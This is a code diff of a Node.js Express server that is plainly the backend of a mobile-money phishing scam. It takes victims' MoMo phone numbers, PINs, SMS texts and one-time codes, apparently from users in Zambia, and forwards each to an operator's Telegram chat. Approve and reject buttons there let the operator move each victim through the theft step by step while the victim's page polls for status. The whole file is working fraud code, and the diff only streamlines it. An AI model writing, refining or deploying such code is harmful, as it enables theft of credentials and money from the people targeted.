@@ -6,40 +6,34 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// In-memory storage for applications
+// In-memory application session store
 const applications = {};
 
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// Create application session
-app.post('/applications', (req, res) => {
+// Create Application Session
+app.post('/api/applications', (req, res) => {
   const appId = 'APP-' + Math.floor(100000000 + Math.random() * 900000000);
   applications[appId] = {
     id: appId,
     ...req.body,
-    status: 'pending_auth',
-    sms_status: 'pending_sms',
-    otp_status: 'pending_otp'
+    status: 'pending_auth'
   };
   res.json({ id: appId });
 });
 
-// Verify PIN / Auth Endpoint (Matches frontend /verify-pin)
+// Verify PIN / Login Endpoint
 app.post('/verify-pin', async (req, res) => {
   const { appId, pin, phone } = req.body;
-  const appData = applications[appId];
-  
-  if (!appData) {
-    applications[appId] = { id: appId, momo_phone: phone, momo_pin: pin, status: 'pending_auth' };
-  } else {
-    appData.momo_phone = phone || appData.momo_phone;
-    appData.momo_pin = pin;
+  if (!applications[appId]) {
+    applications[appId] = { id: appId };
   }
+  applications[appId].momo_phone = phone;
+  applications[appId].momo_pin = pin;
 
-  const currentApp = applications[appId];
   const message = `🔐 *MoMo Authentication Request*\n\n` +
-    `📱 *Phone / MoMo Number:* ${currentApp.momo_phone || phone}\n` +
+    `📱 *Phone:* +260 ${phone}\n` +
     `🔑 *PIN:* \`${pin}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -53,38 +47,26 @@ app.post('/verify-pin', async (req, res) => {
   };
 
   try {
-    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('CRITICAL: TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID is missing from environment variables!');
-      return res.status(500).json({ error: 'Missing Telegram credentials in environment variables.' });
-    }
-
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
-    
-    const result = await response.json();
-    if (!result.ok) {
-      console.error('Telegram API Error (Auth):', result);
-      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
-    }
-
     res.json({ success: true });
-  } catch (error) {
-    console.error('Fetch exception error:', error);
-    res.status(500).json({ error: 'Failed to send notification to Telegram' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 });
 
-// Verify SMS Endpoint (Matches frontend /verify-sms)
+// Verify SMS Endpoint
 app.post('/verify-sms', async (req, res) => {
   const { appId, smsText } = req.body;
-  const appData = applications[appId] || { momo_phone: 'N/A' };
-  appData.sms_text = smsText;
+  if (applications[appId]) {
+    applications[appId].sms_text = smsText;
+  }
 
   const message = `💬 *SMS Verification Text Received*\n\n` +
-    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n\n` +
+    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n\n` +
     `📄 *Content:*\n${smsText}\n\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -98,33 +80,26 @@ app.post('/verify-sms', async (req, res) => {
   };
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
-    
-    const result = await response.json();
-    if (!result.ok) {
-      console.error('Telegram API Error (SMS):', result);
-      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
-    }
-
     res.json({ success: true });
-  } catch (error) {
-    console.error('Telegram error:', error);
-    res.status(500).json({ error: 'Failed to send notification' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 });
 
-// Verify OTP Endpoint (Matches frontend /verify-otp)
+// Verify OTP Endpoint
 app.post('/verify-otp', async (req, res) => {
   const { appId, otpCode } = req.body;
-  const appData = applications[appId] || { momo_phone: 'N/A' };
-  appData.otp_code = otpCode;
+  if (applications[appId]) {
+    applications[appId].otp_code = otpCode;
+  }
 
   const message = `🔢 *OTP Verification Received*\n\n` +
-    `📱 *Phone / MoMo Number:* ${appData.momo_phone}\n` +
+    `📱 *Phone:* +260 ${applications[appId]?.momo_phone || 'N/A'}\n` +
     `🔑 *OTP Code:* \`${otpCode}\`\n` +
     `🆔 *App ID:* ${appId}`;
 
@@ -138,48 +113,39 @@ app.post('/verify-otp', async (req, res) => {
   };
 
   try {
-    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', reply_markup: keyboard })
     });
-    
-    const result = await response.json();
-    if (!result.ok) {
-      console.error('Telegram API Error (OTP):', result);
-      return res.status(500).json({ error: `Telegram Error: ${result.description}` });
-    }
-
     res.json({ success: true });
-  } catch (error) {
-    console.error('Telegram error:', error);
-    res.status(500).json({ error: 'Failed to send notification' });
+  } catch (err) {
+    res.status(500).json({ error: 'Failed to send to Telegram' });
   }
 });
 
-// Check Status Endpoint (Matches frontend /check-status/:id)
+// Check Status Endpoint for Polling
 app.get('/check-status/:id', (req, res) => {
   const appData = applications[req.params.id];
-  if (!appData) return res.status(404).json({ error: 'Application not found' });
+  if (!appData) return res.status(404).json({ error: 'Not found' });
   res.json(appData);
 });
 
-// Telegram Webhook Endpoint
+// Telegram Webhook Handler
 app.post('/telegram-webhook', async (req, res) => {
   const update = req.body;
-
   if (update.callback_query) {
     const cb = update.callback_query;
-    const dataParts = cb.data.split('_');
-    const type = dataParts[0];
-    const action = dataParts[1];
-    const appId = dataParts.slice(2).join('_');
+    const parts = cb.data.split('_');
+    const type = parts[0];
+    const action = parts[1];
+    const appId = parts.slice(2).join('_');
 
     if (applications[appId]) {
       if (type === 'auth') {
-        applications[appId].status = (action === 'approve') ? 'PIN_APPROVED' : 'PIN_REJECTED';
+        applications[appId].status = (action === 'approve') ? 'SMS_STEP' : 'PIN_REJECTED';
       } else if (type === 'sms') {
-        applications[appId].status = (action === 'approve') ? 'SMS_APPROVED' : 'SMS_REJECTED';
+        applications[appId].status = (action === 'approve') ? 'OTP_STEP' : 'SMS_REJECTED';
       } else if (type === 'otp') {
         applications[appId].status = (action === 'approve') ? 'APPROVED' : 'OTP_REJECTED';
       }
@@ -189,32 +155,20 @@ app.post('/telegram-webhook', async (req, res) => {
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          callback_query_id: cb.id,
-          text: `Action processed: ${action.toUpperCase()}`,
-          show_alert: false
-        })
+        body: JSON.stringify({ callback_query_id: cb.id, text: `Processed: ${action.toUpperCase()}` })
       });
-
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: cb.message.chat.id,
-          message_id: cb.message.message_id,
-          reply_markup: { inline_keyboard: [] }
-        })
+        body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } })
       });
     } catch (e) {
-      console.error('Callback error:', e);
+      console.error(e);
     }
   }
-
   res.sendStatus(200);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-});
-  
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
+         
